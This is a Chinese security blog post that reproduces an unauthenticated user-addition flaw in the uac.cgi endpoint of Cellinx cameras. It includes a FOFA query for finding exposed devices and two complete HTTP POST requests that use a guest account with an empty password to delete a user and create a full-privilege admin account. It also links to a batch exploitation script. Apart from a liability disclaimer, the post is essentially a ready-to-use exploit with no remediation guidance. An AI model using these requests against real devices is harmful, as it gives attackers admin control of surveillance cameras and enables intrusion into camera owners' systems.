#  漏洞复现-cellinx 摄像机 uac.cgi 未授权添加用户漏洞（附exp）   
 Yi安全   2024-01-21 12:41  
  
**由于微信公众号推送机制改变了，快来星标不再迷路，谢谢大家！**  
  
****  
免责声明  
  
本文章仅用于信息安全防御技术分享，因用于其他用途而产生不良后果,作者不承担任何法律责任，请严格遵循中华人民共和国相关法律法规，禁止做一切违法犯罪行为。  
文  
章中敏感信息均  
已做多层打马处理。  
传播、利用本文章所提供的信息而造成的任何直接或者间接的后果及损失，均由使用者本人负责，作者不为此承担任何责任，一旦造成后果请自行  
负责。  
  
  
  
  
  
 cellinx摄像机    
  
## 一：漏洞描述  
  
        
  
 cellinx   
摄像机  
 uac.cgi   
未授权添加用户漏洞  
  
## 二：网络空间测绘查询  
  
fofa  
```
body="local/NVT-string.js"
```  
## ‍三：漏洞exp  
```
POST /cgi-bin/UAC.cgi?TYPE=json HTTP/1.1
Host: 
Content-Type: application/json; charset=UTF-8
User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_14_3) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/12.0.3 Safari/605.1.15

{"jsonData":{"username":"guest","password":"","option":"delete_user","data":{"username":"adminqqq"}}}


POST /cgi-bin/UAC.cgi?TYPE=json HTTP/1.1
Host: 
Content-Type: application/json; charset=UTF-8
User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_14_3) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/12.0.3 Safari/605.1.15

{"jsonData":{"username":"guest","password":"","option":"add_user","data":{"username":"adminqqq","password":"adminqqq","permission":{"is_admin":"1","view":"1","ptz":"1","setting":"1","dout":"1"}}}}
```  
  
****## 四：批量脚本获取  
  
![](https://mmbiz.qpic.cn/mmbiz_png/SiciaJiayvKbnFPQE2jyomJlEh5qjnicuqrRIZ16dlicKWG5mexXT5UNibVicBE26d4ib05rFgBTTrYSr0fHLNql0te81g/640?wx_fmt=png&from=appmsg "")  
```
https://github.com/Y1-K1NG/poc_exp/tree/main/20240121cellinx%20%E6%91%84%E5%83%8F%E6%9C%BA%20uac.cgi%20%E6%9C%AA%E6%8E%88%E6%9D%83%E6%B7%BB%E5%8A%A0%E7%94%A8%E6%88%B7%E6%BC%8F%E6%B4%9EEXP
```  
  
![](https://mmbiz.qpic.cn/mmbiz_png/SiciaJiayvKbnFPQE2jyomJlEh5qjnicuqrRROjDfAxtwlyRIfx2yfBkPCy2M7Pwd5JG0AvsL6FPjTuUdnJXWbs6fw/640?wx_fmt=png&from=appmsg "")  
  
  
‍  
  
  
  
  
![](https://mmbiz.qpic.cn/mmbiz_png/ndicuTO22p6ibN1yF91ZicoggaJJZX3vQ77Vhx81O5GRyfuQoBRjpaUyLOErsSo8PwNYlT1XzZ6fbwQuXBRKf4j3Q/640?wx_fmt=png&wxfrom=5&wx_lazy=1&wx_co=1&tp=wxpic "")  
  
  
  
由于传播、利用本公众号Yi安全所提供的信息而造成的任何直接或者间接的后果及损失，均由使用者本人负责，公众号Yi安全及作者不为**此**  
承担任何责任，一旦造成后果请自行承担！如有侵权烦请告知，我们会立即删除并致歉。谢谢！  
  
好文分享收藏赞一下最美点在看哦  
  
  
  
